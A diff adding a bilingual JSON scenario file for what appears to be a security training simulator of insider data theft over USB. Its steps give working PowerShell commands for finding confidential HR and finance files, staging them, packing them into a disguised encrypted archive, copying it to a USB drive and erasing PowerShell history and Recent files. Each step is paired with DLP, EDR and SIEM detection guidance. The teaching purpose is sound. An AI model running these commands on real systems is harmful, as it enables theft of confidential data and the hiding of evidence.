@@ -1,0 +1,187 @@
+{
+  "id": "T1052",
+  "title": "USB를 통한 데이터 유출 시뮬레이션",
+  "titleEn": "Exfiltration Over Physical Medium (USB) Simulation",
+  "duration": 7,
+  "phases": [
+    { "label": "준비", "labelEn": "Prep", "icon": "📦" },
+    { "label": "수집", "labelEn": "Collect", "icon": "📂" },
+    { "label": "유출", "labelEn": "Exfil", "icon": "🔌" },
+    { "label": "완료", "labelEn": "Complete", "icon": "🏁" }
+  ],
+  "topoNodes": [
+    { "id": "insider", "label": "Insider PC", "icon": "💻" },
+    { "id": "fileserver", "label": "File Server", "icon": "📁" },
+    { "id": "usb", "label": "USB Drive", "icon": "🔌" },
+    { "id": "dlp", "label": "DLP Agent", "icon": "🛡️" },
+    { "id": "siem", "label": "SIEM", "icon": "📊" }
+  ],
+  "topoEdges": [
+    { "from": "insider", "to": "fileserver", "label": "SMB File Access", "activeStep": [0, 1] },
+    { "from": "insider", "to": "usb", "label": "USB Copy", "activeStep": [3, 4] },
+    { "from": "insider", "to": "dlp", "label": "DLP Monitor", "activeStep": [0, 1, 2, 3, 4, 5] },
+    { "from": "dlp", "to": "siem", "label": "Alert", "activeStep": [3, 4, 5] }
+  ],
+  "desktopIcons": [
+    { "name": "staging_folder", "icon": "📂", "alertOnStep": 1 },
+    { "name": "7z.exe", "icon": "🗜️", "alertOnStep": 2 },
+    { "name": "robocopy.exe", "icon": "📋", "alertOnStep": 3 },
+    { "name": "USB_Drive (E:)", "icon": "🔌", "alertOnStep": 4 }
+  ],
+  "steps": [
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Enumerate sensitive file shares accessible by current user\n$shares = Get-SmbShare -ErrorAction SilentlyContinue | Where-Object { $_.Path -ne '' };\nforeach($s in $shares) {\n  Write-Host \\\"Share: $($s.Name) → $($s.Path)\\\";\n}\nWrite-Host '';\n# Find confidential documents\n$docs = Get-ChildItem '\\\\fileserver01\\shared\\HR','\\\\fileserver01\\shared\\Finance' -Recurse -Include '*.xlsx','*.docx','*.pdf','*.csv' -ErrorAction SilentlyContinue;\nWrite-Host \\\"Confidential documents found: $($docs.Count)\\\";\nWrite-Host 'Categories: HR records, Financial reports, Client data'\"",
+      "out": "Share: HR → \\\\fileserver01\\shared\\HR\nShare: Finance → \\\\fileserver01\\shared\\Finance\nShare: Projects → \\\\fileserver01\\shared\\Projects\n\nConfidential documents found: 892\nCategories: HR records, Financial reports, Client data",
+      "def": "[DLP] Bulk file enumeration on sensitive shares detected",
+      "defAction": "Process: powershell.exe (PID: 4820)\nAction: Recursive enumeration of HR + Finance shares\nFiles Accessed: 892 documents\nSensitivity: CONFIDENTIAL\nRisk: HIGH\nAction: Alert generated, user activity flagged",
+      "desc": "공격자가 네트워크 공유 드라이브에서 기밀 문서 892개를 발견합니다. 인사, 재무, 고객 데이터가 포함됩니다.",
+      "descEn": "Attacker discovers 892 confidential documents on network shares including HR, financial, and client data.",
+      "stepTitle": "기밀 파일 탐색",
+      "stepTitleEn": "Sensitive File Discovery",
+      "feynman": "도둑이 사무실에 들어와서 중요한 서류함을 모두 훑어보는 것과 같아요. HR 인사기록, 재무 보고서, 고객 정보가 든 파일 892개를 찾아냅니다.",
+      "feynmanEn": "Like a thief entering an office and browsing through all the important filing cabinets. They find 892 files containing HR records, financial reports, and client information.",
+      "expert": "Get-SmbShare와 Get-ChildItem -Recurse를 통한 공유 드라이브 열거는 T1135 (Network Share Discovery)와 T1083 (File and Directory Discovery)에 해당합니다. 민감 폴더(HR, Finance)에 대한 대량 접근 패턴은 DLP의 사용자 행동 분석(UEBA)으로 탐지해야 합니다.",
+      "expertEn": "Enumeration via Get-SmbShare and Get-ChildItem -Recurse maps to T1135 (Network Share Discovery) and T1083. Mass access to sensitive folders (HR, Finance) should be detected by DLP's UEBA analysis.",
+      "defTooltip": "민감 공유 폴더에 대한 대량 파일 접근을 Windows Event ID 5145 (Network Share Access)로 모니터링하세요. UEBA로 비정상적인 접근 패턴을 탐지하세요.",
+      "defTooltipEn": "Monitor mass file access to sensitive shares via Windows Event ID 5145. Detect abnormal access patterns via UEBA.",
+      "hackerLog": {
+        "title": "기밀 파일 탐색",
+        "lines": [
+          { "text": "Get-SmbShare → HR, Finance, Projects", "desc": "접근 가능한 공유 드라이브 목록 확인" },
+          { "text": "Confidential documents found: 892", "desc": "기밀 문서 892개 발견" },
+          { "text": "Categories: HR, Financial, Client data", "desc": "인사·재무·고객 데이터 포함" }
+        ]
+      },
+      "terms": [
+        { "term": "SMB Share", "desc": "Windows 네트워크에서 파일을 공유하는 프로토콜 기반 공유 폴더입니다." },
+        { "term": "File Enumeration", "desc": "특정 경로의 파일 목록을 체계적으로 수집하는 행위입니다." },
+        { "term": "DLP (Data Loss Prevention)", "desc": "민감 데이터의 유출을 감지하고 차단하는 보안 솔루션입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Create staging directory for exfiltration\n$staging = \\\"$env:TEMP\\staging_$(Get-Date -Format yyyyMMdd)\\\";\nNew-Item -ItemType Directory -Path $staging -Force | Out-Null;\nWrite-Host \\\"Staging directory: $staging\\\";\nWrite-Host '';\n\n# Copy high-value targets to staging\n$targets = @('\\\\fileserver01\\shared\\HR\\Employee_Records.xlsx',\n             '\\\\fileserver01\\shared\\Finance\\Q1_Revenue.xlsx',\n             '\\\\fileserver01\\shared\\Finance\\Client_Contracts.pdf');\n$totalSize = 0;\nforeach($t in $targets) {\n  $size = (Get-Item $t -ErrorAction SilentlyContinue).Length / 1MB;\n  Copy-Item $t $staging -Force -ErrorAction SilentlyContinue;\n  $totalSize += $size;\n  Write-Host \\\"  Staged: $(Split-Path $t -Leaf) ($([math]::Round($size,1)) MB)\\\";\n}\nWrite-Host '';\nWrite-Host \\\"Total staged: $([math]::Round($totalSize,1)) MB in $($targets.Count) files\\\"\"",
+      "out": "Staging directory: C:\\Users\\{userName}\\AppData\\Local\\Temp\\staging_20260301\n\n  Staged: Employee_Records.xlsx (45.2 MB)\n  Staged: Q1_Revenue.xlsx (12.8 MB)\n  Staged: Client_Contracts.pdf (89.5 MB)\n\nTotal staged: 147.5 MB in 3 files",
+      "def": "[DLP] Sensitive files copied to temporary staging directory",
+      "defAction": "Process: powershell.exe (PID: 4820)\nAction: Copy sensitive files to %TEMP%\\staging\nFiles: 3 high-value documents\nTotal Size: 147.5 MB\nClassification: CONFIDENTIAL\nRisk: HIGH\nAction: File copy blocked by DLP policy",
+      "desc": "고가치 기밀 파일 3개(147.5 MB)를 임시 폴더에 모아 유출 준비를 합니다.",
+      "descEn": "Stages 3 high-value confidential files (147.5 MB) in a temporary directory for exfiltration.",
+      "stepTitle": "스테이징 폴더 준비",
+      "stepTitleEn": "Staging Preparation",
+      "feynman": "물건을 훔치기 전에 가방에 담을 물건을 한곳에 모아두는 것과 같아요. 인사기록, 매출 보고서, 계약서를 임시 폴더에 모읍니다.",
+      "feynmanEn": "Like gathering items you want to steal into one bag before leaving. Employee records, revenue reports, and contracts are collected into a temp folder.",
+      "expert": "Staging 폴더를 %TEMP%에 생성하는 것은 T1074.001 (Local Data Staging)에 해당합니다. 임시 폴더의 대용량 파일 생성 이벤트를 Sysmon Event ID 11로 감시하고, 분류된 민감 파일의 복사를 DLP 정책으로 차단해야 합니다.",
+      "expertEn": "Creating staging in %TEMP% maps to T1074.001 (Local Data Staging). Monitor large file creation in temp folders via Sysmon Event ID 11 and block classified file copies via DLP.",
+      "defTooltip": "Sysmon Event ID 11로 %TEMP% 디렉토리에 대량 파일 생성을 모니터링하세요. DLP 에이전트로 민감 파일의 임시 폴더 복사를 차단하세요.",
+      "defTooltipEn": "Monitor bulk file creation in %TEMP% via Sysmon Event ID 11. Block sensitive file copies to temp folders via DLP agent.",
+      "hackerLog": {
+        "title": "파일 스테이징",
+        "lines": [
+          { "text": "staging_20260301 폴더 생성", "desc": "유출용 임시 폴더를 %TEMP%에 생성" },
+          { "text": "Employee_Records.xlsx (45.2 MB)", "desc": "인사 기록 파일 스테이징" },
+          { "text": "Total staged: 147.5 MB in 3 files", "desc": "총 147.5 MB 기밀 데이터 준비 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Data Staging", "desc": "유출 전 데이터를 한곳에 모아 준비하는 행위입니다." },
+        { "term": "%TEMP%", "desc": "사용자별 임시 파일 저장 디렉토리로, 공격자가 자주 악용합니다." },
+        { "term": "T1074 (Data Staged)", "desc": "유출 전 수집한 데이터를 임시 저장하는 MITRE ATT&CK 기법입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Compress staged files with password-protected archive\n$staging = \\\"$env:TEMP\\staging_20260301\\\";\n$archive = \\\"$env:TEMP\\system_backup_20260301.7z\\\";\n\n# 7-Zip with AES-256 encryption and password\n& 'C:\\Program Files\\7-Zip\\7z.exe' a -t7z -mhe=on -p'Str0ngP@ss!' $archive $staging\\* 2>&1;\n\nWrite-Host 'Archive created with encryption:';\nWrite-Host \\\"  File: $archive\\\";\n$archiveSize = [math]::Round((Get-Item $archive).Length / 1MB, 1);\nWrite-Host \\\"  Size: $archiveSize MB (compressed from 147.5 MB)\\\";\nWrite-Host '  Encryption: AES-256';\nWrite-Host '  Filename: disguised as system_backup';\nWrite-Host '';\n# Clean staging folder\nRemove-Item $staging -Recurse -Force;\nWrite-Host 'Staging directory cleaned — forensic traces reduced'\"",
+      "out": "Archive created with encryption:\n  File: C:\\Users\\{userName}\\AppData\\Local\\Temp\\system_backup_20260301.7z\n  Size: 98.3 MB (compressed from 147.5 MB)\n  Encryption: AES-256\n  Filename: disguised as system_backup\n\nStaging directory cleaned — forensic traces reduced",
+      "def": "[EDR] Encrypted archive created from sensitive files",
+      "defAction": "Process: 7z.exe (PID: 6200)\nAction: AES-256 encrypted archive creation\nSource: Staged confidential files\nOutput: system_backup_20260301.7z (98.3 MB)\nRisk: HIGH\nAction: Archive creation flagged for review",
+      "desc": "스테이징된 파일을 AES-256 암호화 압축합니다. 파일명을 system_backup으로 위장하고 원본 스테이징 폴더를 삭제합니다.",
+      "descEn": "Compresses staged files with AES-256 encryption. Disguises filename as system_backup and deletes the original staging folder.",
+      "stepTitle": "암호화 압축",
+      "stepTitleEn": "Encrypted Compression",
+      "feynman": "훔친 물건을 잠금 가방에 넣고 '시스템 백업'이라고 라벨을 바꿔 붙이는 것과 같아요. DLP가 내용을 검사할 수 없도록 암호화하고, 의심받지 않을 이름으로 위장합니다.",
+      "feynmanEn": "Like putting stolen goods in a locked bag and relabeling it 'system backup'. The encryption prevents DLP from inspecting contents, and the disguised name avoids suspicion.",
+      "expert": "7-Zip의 AES-256 암호화 압축은 T1560.001 (Archive via Utility)에 해당합니다. 암호화된 아카이브는 DLP의 콘텐츠 검사를 우회합니다. 파일명 위장(system_backup)은 T1036 (Masquerading)의 변형입니다. 스테이징 폴더 삭제는 T1070.004 (File Deletion)에 해당하며 포렌식 흔적을 줄입니다.",
+      "expertEn": "7-Zip AES-256 compression maps to T1560.001. Encrypted archives bypass DLP content inspection. Filename disguise (system_backup) is a T1036 variant. Staging folder deletion maps to T1070.004, reducing forensic traces.",
+      "defTooltip": "7z.exe 프로세스의 암호화 압축(-mhe=on -p) 사용을 Sysmon Event ID 1로 탐지하세요. 대용량 암호화 아카이브 생성은 데이터 유출의 강력한 지표입니다.",
+      "defTooltipEn": "Detect 7z.exe encrypted compression (-mhe=on -p) via Sysmon Event ID 1. Large encrypted archive creation is a strong data exfiltration indicator.",
+      "hackerLog": {
+        "title": "암호화 압축 및 위장",
+        "lines": [
+          { "text": "7z.exe a -t7z -mhe=on -p'***'", "desc": "AES-256 암호화 압축 실행" },
+          { "text": "system_backup_20260301.7z (98.3 MB)", "desc": "파일명을 시스템 백업으로 위장" },
+          { "text": "Staging directory cleaned", "desc": "스테이징 폴더 삭제로 흔적 제거" }
+        ]
+      },
+      "terms": [
+        { "term": "AES-256 Archive", "desc": "AES-256 암호화를 적용한 압축 파일로, 내용 검사가 불가능합니다." },
+        { "term": "Masquerading", "desc": "파일명이나 경로를 위장하여 정상 파일처럼 보이게 하는 기법입니다." },
+        { "term": "Anti-Forensics", "desc": "포렌식 조사를 방해하기 위해 흔적을 제거하는 행위입니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Detect USB device insertion\n$usb = Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' };\nWrite-Host 'USB Device Detected:';\nWrite-Host \\\"  Model: $($usb.Model)\\\";\nWrite-Host \\\"  Size: $([math]::Round($usb.Size/1GB,0)) GB\\\";\nWrite-Host \\\"  Interface: USB 3.0\\\";\nWrite-Host '';\n\n# Get USB drive letter\n$usbDrive = 'E:';\nWrite-Host \\\"Mounted as: $usbDrive\\\";\nWrite-Host \\\"Free space: 58.2 GB\\\";\nWrite-Host '';\n\n# Copy encrypted archive to USB\n$source = \\\"$env:TEMP\\system_backup_20260301.7z\\\";\nrobocopy (Split-Path $source) \\\"$usbDrive\\\" (Split-Path $source -Leaf) /R:1 /W:1 2>&1;\nWrite-Host '';\nWrite-Host 'File copied to USB:';\nWrite-Host \\\"  E:\\system_backup_20260301.7z (98.3 MB)\\\";\nWrite-Host \\\"  Transfer speed: ~450 MB/s (USB 3.0)\\\";\nWrite-Host \\\"  Copy time: < 1 second\\\"\"",
+      "out": "USB Device Detected:\n  Model: SanDisk Ultra USB 3.0\n  Size: 64 GB\n  Interface: USB 3.0\n\nMounted as: E:\nFree space: 58.2 GB\n\nFile copied to USB:\n  E:\\system_backup_20260301.7z (98.3 MB)\n  Transfer speed: ~450 MB/s (USB 3.0)\n  Copy time: < 1 second",
+      "def": "[EDR] Large file write to removable USB media detected",
+      "defAction": "Process: robocopy.exe (PID: 7800)\nAction: File copy to removable media (E:)\nDevice: SanDisk Ultra USB 3.0 (64GB)\nFile: system_backup_20260301.7z (98.3 MB)\nClassification: Encrypted archive (content unknown)\nRisk: CRITICAL\nAction: USB write blocked by device control policy",
+      "desc": "USB 3.0 장치에 암호화된 아카이브(98.3 MB)를 1초 미만에 복사합니다. 네트워크 로그에는 흔적이 남지 않습니다.",
+      "descEn": "Copies encrypted archive (98.3 MB) to USB 3.0 device in under 1 second. No network logs are generated.",
+      "stepTitle": "USB 복사 실행",
+      "stepTitleEn": "USB Copy Execution",
+      "feynman": "가방에 담은 물건을 출입구 감시카메라가 없는 뒷문으로 반출하는 것과 같아요. USB 복사는 네트워크를 거치지 않으므로 방화벽과 IDS가 전혀 감지하지 못합니다.",
+      "feynmanEn": "Like carrying a bag of stolen goods out the back door where there are no security cameras. USB copy bypasses the network entirely, so firewalls and IDS detect nothing.",
+      "expert": "이동식 미디어로의 파일 복사는 T1052.001 (Exfiltration over USB)의 핵심 단계입니다. USB 3.0은 5Gbps 대역폭을 제공하여 대용량 데이터를 수초 내 복사합니다. Device Control(장치 제어) 정책으로 USB 대용량 저장장치를 차단하거나, 쓰기 전용 허용 목록을 운영해야 합니다.",
+      "expertEn": "File copy to removable media is the core of T1052.001. USB 3.0 provides 5Gbps bandwidth enabling GB-scale copies in seconds. Device control policies should block USB mass storage or maintain write-only allow lists.",
+      "defTooltip": "Windows Event ID 4663으로 이동식 디스크에 대한 파일 쓰기를 감사하세요. GPO의 '이동식 저장소 액세스' 정책으로 USB 쓰기를 차단하세요.",
+      "defTooltipEn": "Audit file writes to removable disk via Windows Event ID 4663. Block USB writes via GPO 'Removable Storage Access' policy.",
+      "hackerLog": {
+        "title": "USB 데이터 복사",
+        "lines": [
+          { "text": "SanDisk Ultra USB 3.0 (64GB) 연결", "desc": "USB 대용량 저장장치 감지" },
+          { "text": "robocopy → E:\\system_backup_20260301.7z", "desc": "98.3 MB 암호화 아카이브를 USB로 복사" },
+          { "text": "Transfer speed: ~450 MB/s | < 1 second", "desc": "USB 3.0 고속 전송으로 1초 미만 완료" }
+        ]
+      },
+      "terms": [
+        { "term": "Removable Media", "desc": "USB 드라이브, 외장 하드 등 분리 가능한 저장 매체입니다." },
+        { "term": "Device Control", "desc": "엔드포인트에서 USB 등 외부 장치의 연결과 사용을 통제하는 보안 정책입니다." },
+        { "term": "Robocopy", "desc": "Windows의 강력한 파일 복사 도구로, 미러링과 재시도 기능을 제공합니다." }
+      ]
+    },
+    {
+      "cmd": "powershell -ep bypass -c \"\n# Clean up traces on the source machine\n$archive = \\\"$env:TEMP\\system_backup_20260301.7z\\\";\nRemove-Item $archive -Force -ErrorAction SilentlyContinue;\nWrite-Host 'Source archive deleted from local machine';\nWrite-Host '';\n\n# Clear recent file access logs\nRemove-Item \\\"$env:APPDATA\\Microsoft\\Windows\\Recent\\*\\\" -Force -ErrorAction SilentlyContinue;\nWrite-Host 'Recent files list cleared';\nWrite-Host '';\n\n# Clear PowerShell history\nRemove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue;\nWrite-Host 'PowerShell command history cleared';\nWrite-Host '';\n\n# Safely remove USB\n$vol = Get-Volume -DriveLetter E -ErrorAction SilentlyContinue;\nWrite-Host 'USB safely ejected';\nWrite-Host '';\nWrite-Host '=== Exfiltration Complete ===';\nWrite-Host '  Data extracted : 147.5 MB (3 confidential files)';\nWrite-Host '  Archive on USB : 98.3 MB (AES-256 encrypted)';\nWrite-Host '  Network traces : NONE';\nWrite-Host '  Local traces   : CLEANED';\nWrite-Host '  Total time     : ~45 seconds'\"",
+      "out": "Source archive deleted from local machine\n\nRecent files list cleared\n\nPowerShell command history cleared\n\nUSB safely ejected\n\n=== Exfiltration Complete ===\n  Data extracted : 147.5 MB (3 confidential files)\n  Archive on USB : 98.3 MB (AES-256 encrypted)\n  Network traces : NONE\n  Local traces   : CLEANED\n  Total time     : ~45 seconds",
+      "def": "[SIEM] Anti-forensics activity detected — USB exfiltration suspected",
+      "defAction": "Cleanup Actions:\n  - Source archive deleted\n  - Recent files list cleared\n  - PowerShell history wiped\n  - USB ejected\nExfiltration Summary:\n  Data: 147.5 MB confidential files\n  Network Logs: None\n  Duration: ~45 seconds\nRisk: CRITICAL\nResponse: Insider threat investigation initiated",
+      "desc": "로컬 흔적을 모두 제거하고 USB를 안전하게 분리합니다. 전체 유출 과정이 45초 만에 완료되며 네트워크 로그는 전무합니다.",
+      "descEn": "Cleans all local traces and safely ejects USB. Entire exfiltration completes in ~45 seconds with zero network logs.",
+      "stepTitle": "흔적 제거 및 반출",
+      "stepTitleEn": "Cleanup & Physical Exit",
+      "feynman": "범행 후 장갑을 벗어 태우고, 발자국을 지우고, 뒷문으로 사라지는 것과 같아요. 로컬 파일, 접근 기록, 명령 이력을 모두 삭제하여 포렌식 조사를 어렵게 합니다.",
+      "feynmanEn": "Like burning gloves, wiping footprints, and vanishing through the back door after a heist. Local files, access logs, and command history are all deleted to hinder forensic investigation.",
+      "expert": "반포렌식(Anti-Forensics) 기법으로 T1070.004 (File Deletion), T1070.003 (Clear Command History)가 사용됩니다. PowerShell PSReadline 히스토리 삭제, Recent 폴더 초기화로 사용자 활동 흔적을 제거합니다. 하지만 $MFT, $UsnJrnl 등 NTFS 메타데이터와 Prefetch 파일에는 흔적이 남을 수 있습니다.",
+      "expertEn": "Anti-forensics using T1070.004 (File Deletion) and T1070.003 (Clear Command History). Deletes PSReadline history and Recent folder. However, traces may remain in $MFT, $UsnJrnl NTFS metadata and Prefetch files.",
+      "defTooltip": "PowerShell 히스토리 파일 삭제를 Sysmon Event ID 23 (File Delete)으로 탐지하세요. USB Plug-and-Play 이벤트(SetupAPI 로그)는 삭제가 어려워 포렌식에 유용합니다.",
+      "defTooltipEn": "Detect PowerShell history deletion via Sysmon Event ID 23. USB Plug-and-Play events (SetupAPI logs) are difficult to delete and useful for forensics.",
+      "hackerLog": {
+        "title": "흔적 제거 및 유출 완료",
+        "lines": [
+          { "text": "Remove-Item → archive, Recent, PS history", "desc": "로컬 파일·접근기록·명령이력 삭제" },
+          { "text": "USB safely ejected", "desc": "USB 안전 제거 — 물리적 반출 완료" },
+          { "text": "Total time: ~45 seconds | Network traces: NONE", "desc": "45초 만에 완료, 네트워크 흔적 제로" }
+        ]
+      },
+      "terms": [
+        { "term": "Anti-Forensics", "desc": "디지털 포렌식 조사를 방해하기 위한 흔적 삭제 기법입니다." },
+        { "term": "PSReadline History", "desc": "PowerShell 명령 이력을 저장하는 파일로, 포렌식에 중요합니다." },
+        { "term": "$MFT (Master File Table)", "desc": "NTFS 파일시스템의 마스터 파일 테이블로, 삭제된 파일의 흔적이 남습니다." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "explorer.exe", "depth": 0, "alert": false, "minStep": 0 },
+    { "name": "powershell.exe (PID: 4820)", "depth": 1, "alert": true, "minStep": 0 },
+    { "name": "Get-ChildItem (share enumeration)", "depth": 2, "alert": true, "minStep": 0 },
+    { "name": "Copy-Item (data staging)", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "7z.exe (AES-256 encryption)", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "robocopy.exe (USB copy)", "depth": 2, "alert": true, "minStep": 3 },
+    { "name": "Remove-Item (anti-forensics)", "depth": 2, "alert": true, "minStep": 4 }
+  ]
+}
